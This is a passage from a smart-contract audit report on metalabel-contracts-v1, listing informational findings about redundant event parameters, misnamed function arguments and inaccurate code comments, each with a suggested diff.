https://github.com/0xSplits/splits-waterfall/blob/master/src/WaterfallModuleFactory.sol#L51-L57

#### **Recommendations**

Consider changing the `WaterfallCreated` event in WaterfallFactory.sol to only include the following parameters:

```diff
/// @notice A new split was deployed.
event WaterfallCreated(
    address indexed waterfall,
    uint64 nodeId,
-   address token,
-   address nonWaterfallRecipient,
-   address[] recipients,
-   uint256[] thresholds,
    string metadata
);
```

### [I-3] Wrong variable naming

#### **Context**

- [contracts/ResourceFactory.sol#L94-L110](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/ResourceFactory.sol#L94-L110)

#### **Description**

`waterfall` is used instead of `resource` in the following functions in ResourceFactory:

```diff
    function broadcast(
-       address waterfall,
+       address resource,
        string calldata topic,
        string calldata message
-   ) external onlyAuthorized(waterfall) {
-       emit ResourceBroadcast(waterfall, topic, message);
+   ) external onlyAuthorized(resource) {
+       emit ResourceBroadcast(resource, topic, message);
    }

    /// @inheritdoc IResourceFactory
    function broadcastAndStore(
-       address waterfall,
+       address resource,
        string calldata topic,
        string calldata message
-   ) external onlyAuthorized(waterfall) {
-       messageStorage[waterfall][topic] = message;
-       emit ResourceBroadcast(waterfall, topic, message);
+   ) external onlyAuthorized(resource) {
+       messageStorage[resource][topic] = message;
+       emit ResourceBroadcast(resource, topic, message);
    }
```

#### **Recommendations**

Use the correct argument names.

### [I-4] Wrong comments

#### **Context**

- [contracts/WaterfallFactory.sol](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/WaterfallFactory.sol)
- [contracts/NodeRegistry.sol#L276-L278](https://github.com/metalabel/metalabel-contracts-v1/blob/effe2e89996d6809c5ec6c6da10c663246f91fc1/contracts/NodeRegistry.sol#L276-L278)

#### **Description**

There are several incorrect comments in the code:

```
contracts/WaterfallFactory.sol

/// @notice A new split was deployed.
event WaterfallCreated(

/// @notice Launch a new split
function createWaterfall(

// Deploy and store the split.
waterfall = waterfallFactory.createWaterfallModule(
```

```
contracts/NodeRegistry.sol

/// group node.  This is a restrictive check, but creative use of future
/// controllers can make it easier to re-parent a node
function setNodeGroupNode(uint64 id, uint64 groupNode)
```

#### **Recommendations**

Correct the above comments.
